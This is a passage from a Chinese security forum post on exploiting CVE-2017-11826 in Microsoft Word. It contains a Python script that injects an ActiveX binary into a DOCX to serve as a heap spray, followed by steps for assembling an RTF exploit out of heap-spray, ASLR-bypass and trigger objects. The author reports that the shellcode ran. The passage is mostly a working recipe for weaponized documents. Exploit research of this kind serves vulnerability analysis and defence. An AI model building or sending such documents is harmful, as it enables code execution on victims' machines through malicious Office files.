
```python
import os
import shutil
import zipfile

template_path = ""
final_docx_name = ""
activeX_bin_path = ""


def pack_file_to_open_xml_docx(template_path, final_docx_name, activeX_bin_path):
    if not os.path.exists(template_path) or not os.path.exists(activeX_bin_path):
        print("Template docx file or activeX.bin file not exist.")
        return

    with open(activeX_bin_path, "rb") as f_:
        object_bin_data = f_.read()

    zip_docx = template_path + ".zip"
    current_dir = os.path.abspath(os.path.dirname(__file__))
    new_path = os.path.join(current_dir, "exp", os.path.basename(zip_docx))

    if os.path.exists(new_path):
        os.remove(new_path)

    shutil.copy(template_path, new_path)
    zip_docx = new_path

    # open temp docx and a copy for modification
    zin = zipfile.ZipFile(zip_docx, "r")
    zip_docx_copy = zip_docx + "_copy_"
    zout = zipfile.ZipFile(zip_docx_copy, "w")

    # modify the docx template with exploit
    for item in zin.infolist():
        if item.filename.find("activeX1") >= 0 and item.filename.find(".bin") >= 0:
            pass
        else:
            buffer = zin.read(item.filename)
            zout.writestr(item, buffer)  # use existing file

    zout.writestr("word/activeX/" + "activeX1.bin", object_bin_data)
    zout.close()
    zin.close()

    # convert to docx
    os.rename(zip_docx_copy, final_docx_name)
    os.remove(zip_docx)


pack_file_to_open_xml_docx(template_path, final_docx_name, activeX_bin_path)
```

新建一个 RTF 文件，将替换好的 DOCX 文件添加到 RTF 文件中，保存后使用 `010Editor` 打开，搜索 `object`，将 `{\object` 和 `{\*\objdata` 的全部内容复制：

![image-20210804120429898](https://bbs.kanxue.com/upload/attach/202108/929902_FGE78SSGE4QDN42.jpg)

再新建一个 RTF 文件，按照堆喷射、Bypass ASLR 和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原 EXP 中复制过来即可，最终 EXP 的结构如下所示：

![image-20210804141320122](https://bbs.kanxue.com/upload/attach/202108/929902_UGNTWXPANJUSH8Z.jpg)

最终成功执行了 shellcode：

![image-20210804141657444](https://bbs.kanxue.com/upload/attach/202108/929902_GWZ77H6GST4K8BM.jpg)

更多内容请前往微信公众号：**天玄安全实验室**

## 参考链接

1. [CVE-2017-11826漏洞分析、利用及动态检测](https://bbs.kanxue.com/elink@5a5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3%4x3e0t1J5)

2. [office CVE-2017-11826杂谈](https://bbs.kanxue.com/elink@95eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3k6$3!0S2j5X3!0#2N6o6u0Q4x3V1k6H3i4K6u0r3z5o6p5^5y4U0l9I4z5q4)9J5k6h3S2@1L8h3H3`.)

3. [SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE](https://bbs.kanxue.com/elink@01bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4M7X3g2&6K9r3q4@1K9r3q4U0K9$3g2J5i4K6u0W2L8X3g2@1i4K6u0r3i4K6y4r3M7q4)9K6c8o6V1I4x3b7`.`.)

4. [Exploiting Word: CVE-2017-11826](https://bbs.kanxue.com/elink@2e6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1j5i4u0D9L8$3N6A6j5#2)9J5k6h3y4G2L8g2)9J5c8X3u0D9L8$3N6Q4x3V1k6W2P5s2m8D9L8$3W2@1K9h3&6Y4i4K6u0V1N6$3!0J5k6q4)9J5k6r3y4$3k6g2)9J5k6o6t1H3x3e0N6Q4x3X3b7I4x3e0R3J5y4W2)9J5c8R3`.`.)

5. [Open XML标签解析类漏洞分析思路](https://bbs.kanxue.com/elink@bccK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5H3x3K6l9^5x3l9`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合 AI 与 Windows 内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
